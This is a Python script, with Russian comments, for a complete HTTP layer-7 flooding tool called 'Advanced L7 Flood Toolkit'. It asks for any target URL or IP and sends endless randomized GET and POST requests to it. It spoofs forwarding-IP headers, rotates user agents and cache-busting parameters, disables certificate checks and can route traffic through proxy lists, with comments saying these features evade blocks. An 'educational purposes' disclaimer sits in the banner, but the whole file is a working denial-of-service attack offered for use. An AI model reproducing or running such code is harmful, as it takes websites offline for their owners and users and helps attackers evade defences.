import subprocess
import sys
import asyncio
import random
import itertools
import platform
import os
import time
import json
import ssl

# Красивый ASCII-арт
def show_banner():
    print("""
    \033[91m
    ██████╗ ██████╗ ███████╗██╗███████╗██╗  ██╗
    ██╔══██╗██╔══██╗██╔════╝██║██╔════╝██║ ██╔╝
    ██║  ██║██║  ██║███████╗██║███████╗█████╔╝ 
    ██║  ██║██║  ██║╚════██║██║╚════██║██╔═██╗ 
    ██████╔╝██████╔╝███████║██║███████║██║  ██╗
    ╚═════╝ ╚═════╝ ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝
    \033[0m
    \033[94m>>> Advanced L7 Flood Toolkit v3.0 <<<\033[0m
    \033[93m>>> Cross-Platform: PC | Termux | Android <<<\033[0m
    \033[91m>>> Use only for educational purposes! <<<\033[0m
    """)

def install_dependencies():
    required = {
        'aiohttp': 'aiohttp',
        'aiohttp_socks': 'aiohttp-socks', 
        'fake_useragent': 'fake-useragent'
    }
    
    print("\033[96m[+] Checking dependencies...\033[0m")
    for package, pip_name in required.items():
        try:
            __import__(package)
            print(f"\033[92m[+] {package} already installed\033[0m")
        except ImportError:
            print(f"\033[93m[!] Installing {package}...\033[0m")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], 
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"\033[92m[+] {package} successfully installed\033[0m")
            except Exception as e:
                print(f"\033[91m[!] Error installing {package}: {e}\033[0m")
                if "termux" in sys.prefix.lower():
                    print("\033[93m[i] In Termux try: pkg install python && pip install {}\033[0m".format(pip_name))

show_banner()
install_dependencies()

# Импортируем модули после установки
try:
    import aiohttp
    from fake_useragent import UserAgent
    try:
        from aiohttp_socks import ProxyConnector
    except ImportError:
        ProxyConnector = None
        print("\033[91m[!] aiohttp_socks not installed, proxies disabled\033[0m")
except ImportError as e:
    print(f"\033[91m[!] Critical import error: {e}\033[0m")
    print("\033[93m[!] Try manual dependency installation:\033[0m")
    print("pip install aiohttp aiohttp-socks fake-useragent")
    sys.exit(1)

def detect_platform():
    system = platform.system().lower()
    if "termux" in sys.prefix.lower() or "android" in system:
        return "termux"
    return system

def optimize_for_platform(platform_type):
    if platform_type == "termux":
        print("\033[96m[i] Termux detected, optimizing for mobile\033[0m")
        return {
            'max_threads': 50,
            'timeout': 5,
            'use_proxies': False
        }
    else:
        return {
            'max_threads': 500,
            'timeout': 3,
            'use_proxies': True
        }

async def advanced_flood(target, threads_count, proxy_list=None, platform_config=None):
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
        
    ua = UserAgent()
    request_count = 0
    endpoints = ['', 'wp-admin', 'api/v1', 'login', 'static/img', 'data.json', 'user/profile', 'admin/login', 'api/json', 'graphql']
    
    # Генератор случайных данных для POST-запросов
    def generate_random_data():
        data_types = [
            lambda: json.dumps({'data': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=random.randint(50, 500)))}),
            lambda: ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890', k=random.randint(100, 1000))),
            lambda: '&'.join([f'{random.choice("abcdefghijkl")}={random.randint(1000,9999)}' for _ in range(random.randint(5, 15))])
        ]
        return random.choice(data_types)()
    
    if proxy_list and ProxyConnector:
        proxy_cycle = itertools.cycle(proxy_list)
    else:
        proxy_cycle = itertools.repeat(None)
        if proxy_list and not ProxyConnector:
            print("\033[91m[!] aiohttp_socks not available, working without proxies\033[0m")
        
    async def make_request(session):
        nonlocal request_count
        try:
            endpoint = random.choice(endpoints)
            url = f"{target}/{endpoint}?rnd={random.randint(1000,9999)}&cache={random.randint(100000,999999)}"
            
            # Случайный выбор метода (GET или POST)
            method = random.choice([session.get, session.post])
            
            # Случайные заголовки для обхода блокировок
            headers = {
                'User-Agent': ua.random,
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Client-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': random.choice(['ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'en-US,en;q=0.9', 'de-DE,de;q=0.9']),
                'Accept-Encoding': random.choice(['gzip, deflate, br', 'gzip, deflate']),
                'Connection': random.choice(['keep-alive', 'close']),
                'Cache-Control': random.choice(['no-cache', 'max-age=0', '']),
                'Referer': random.choice([f'http://{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}', 
                                         'https://www.google.com/', 'https://www.bing.com/', 'https://yandex.ru/'])
            }
            
            # Случайные данные для POST-запросов
            data = generate_random_data() if method == session.post else None
            
            timeout = aiohttp.ClientTimeout(total=platform_config['timeout'])
            
            # Создаем собственный SSL-контекст для обхода проверок
            ssl_context = ssl.create_default_context()
            ssl_context.check_hostname = False
            ssl_context.verify_mode = ssl.CERT_NONE
            
            if method == session.get:
                async with method(url, headers=headers, timeout=timeout, ssl=ssl_context) as resp:
                    pass
            else:
                # Для POST-запросов добавляем случайный Content-Type
                post_headers = headers.copy()
                post_headers['Content-Type'] = random.choice([
                    'application/json',
                    'application/x-www-form-urlencoded',
                    'text/plain',
                    'multipart/form-data'
                ])
                async with method(url, headers=post_headers, data=data, timeout=timeout, ssl=ssl_context) as resp:
                    pass
                    
            request_count += 1
        except Exception as e:
            pass

    print(f"\033[94m[+] Starting advanced L7 flood with {threads_count} threads\033[0m")
    print(f"\033[96m[+] Platform: {detect_platform()}\033[0m")
    print("\033[96m[+] Methods: GET/POST with random data\033[0m")
    print("\033[93m[+] Press CTRL+C to stop\033[0m")
    print("\033[91m[!] WARNING: Use only for educational purposes!\033[0m")

    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, limit=0)) as session:
            tasks = []
            while True:
                task = asyncio.create_task(make_request(session))
                tasks.append(task)
                
                if len(tasks) >= threads_count * 5:
                    await asyncio.gather(*tasks, return_exceptions=True)
                    tasks.clear()
                
                if request_count % 10 == 0:
                    print(f"\r\033[92m[+] Requests sent: {request_count} | Active tasks: {len(tasks)}\033[0m", end='')
                
                await asyncio.sleep(0.01)
                
    except KeyboardInterrupt:
        print(f"\n\033[93m[!] Attack stopped. Total requests: {request_count}\033[0m")
    except Exception as e:
        print(f"\n\033[91m[!] Critical error: {e}\033[0m")

if __name__ == "__main__":
    current_platform = detect_platform()
    platform_config = optimize_for_platform(current_platform)
    
    print("\033[96m" + "="*50 + "\033[0m")
    target = input("\033[95m[?] Enter target (URL or IP): \033[0m").strip()
    
    try:
        default_threads = platform_config['max_threads']
        threads_input = input(f"\033[95m[?] Thread count ({default_threads}): \033[0m").strip()
        threads = int(threads_input) if threads_input else default_threads
        threads = min(threads, platform_config['max_threads'])
    except:
        threads = platform_config['max_threads']
    
    proxy_list = []
    if platform_config['use_proxies']:
        use_proxies = input("\033[95m[?] Use proxies? (y/N): \033[0m").lower().strip()
        if use_proxies == 'y':
            proxy_file = input("\033[95m[?] Path to proxy file: \033[0m").strip()
            try:
                with open(proxy_file, 'r') as f:
                    proxy_list = [line.strip() for line in f.readlines() if line.strip()]
                print(f"\033[92m[+] Loaded {len(proxy_list)} proxies\033[0m")
            except:
                print("\033[91m[!] File not found, working without proxies\033[0m")
    else:
        print("\033[96m[i] Proxies disabled on mobile devices for stability\033[0m")
    
    print("\033[94m[+] Starting in 3 seconds...\033[0m")
    for i in range(3, 0, -1):
        print(f"\033[93m[>] {i}...\033[0m")
        time.sleep(1)
    
    # Проверяем, что aiohttp импортирован корректно
    if 'aiohttp' not in globals():
        print("\033[91m[!] Critical error: aiohttp not imported\033[0m")
        sys.exit(1)
    
    asyncio.run(advanced_flood(target, threads, proxy_list, platform_config))
